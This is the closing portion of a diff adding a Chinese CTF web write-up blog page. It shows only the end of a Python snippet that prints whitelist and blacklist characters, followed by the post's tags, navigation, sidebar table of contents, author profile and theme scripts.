class="string">&#x27;------------------------------------&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;whitelist: &quot;</span>, <span class="string">&#x27;&#x27;</span>.join(whitelist))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;blacklist: &quot;</span>, <span class="string">&#x27;&#x27;</span>.join(blacklist))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/web/" rel="tag"># web</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/posts/62478.html" rel="prev" title="HMV-easypwn WP复现与复盘">
+      <i class="fa fa-chevron-left"></i> HMV-easypwn WP复现与复盘
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/posts/46850.html" rel="next" title="HMV-Chromee WP复现及复盘">
+      HMV-Chromee WP复现及复盘 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-ssrf"><span class="nav-number">1.</span> <span class="nav-text">ez_ssrf</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ez-php"><span class="nav-number">2.</span> <span class="nav-text">ez_php</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#light-pink"><span class="nav-number">3.</span> <span class="nav-text">light_pink</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Coding-Loving"><span class="nav-number">4.</span> <span class="nav-text">Coding Loving</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="guayu-kakeru"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">guayu-kakeru</p>
+  <div class="site-description" itemprop="description">一年过后，你会希望从今天就开始行动。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">88</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">20</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/guayu-kakeru" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;guayu-kakeru" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:1806449041@qq.com" title="E-Mail → mailto:1806449041@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+  <div class="links-of-recent-posts motion-element">
+    <div class="links-of-recent-posts-title">
+      最近文章
+    </div>
+    <ul class="links-of-recent-posts-list">
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/82714.html" title="posts&#x2F;82714.html">CTF 知识点整理</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/3265.html" title="posts&#x2F;3265.html">Windows工具</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/57685.html" title="posts&#x2F;57685.html">tryhackme-AD笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/30538.html" title="posts&#x2F;30538.html">tryhackme-学习笔记</a>
+        </li>
+        <li class="links-of-recent-posts-item">
+          <a href="/posts/36199.html" title="posts&#x2F;36199.html">vulnhub-Brainpan</a>
+        </li>
+    </ul>
+  </div>
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2026</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">guayu-kakeru</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
